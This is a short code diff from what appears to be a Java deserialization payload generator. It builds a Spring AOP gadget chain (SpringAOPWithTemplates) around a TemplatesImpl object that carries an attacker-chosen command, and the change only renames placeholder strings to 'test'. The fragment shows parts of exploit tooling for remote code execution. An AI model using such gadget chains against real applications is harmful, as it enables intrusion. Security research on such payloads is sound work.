@@ -32,7 +32,7 @@ public class SpringAOPWithTemplates extends PayloadRunner implements CommandObje
         Object template = Gadgets.createTemplatesImpl(cmd);
 
         AdvisedSupport advisedSupport = new AdvisedSupport();
-        advisedSupport.setTarget("A.R.");
+        advisedSupport.setTarget("test");
 
         ExposeInvocationInterceptor exposeInvocationInterceptor = Reflections.createWithoutConstructor(ExposeInvocationInterceptor.class);
         Advisor advisor0 = new DefaultIntroductionAdvisor(exposeInvocationInterceptor);
@@ -62,8 +62,8 @@ public class SpringAOPWithTemplates extends PayloadRunner implements CommandObje
 
         SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(annotatedConstructor);
         AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(AnnotatedConstructor.class.getMethod("call1", Object.class), new AspectJExpressionPointcut(), aspectInstanceFactory);
-        advice.setArgumentNames("dubhe");
-        advice.setReturningName("dubhe");
+        advice.setArgumentNames("test");
+        advice.setReturningName("test");
         return advice;
     }
 
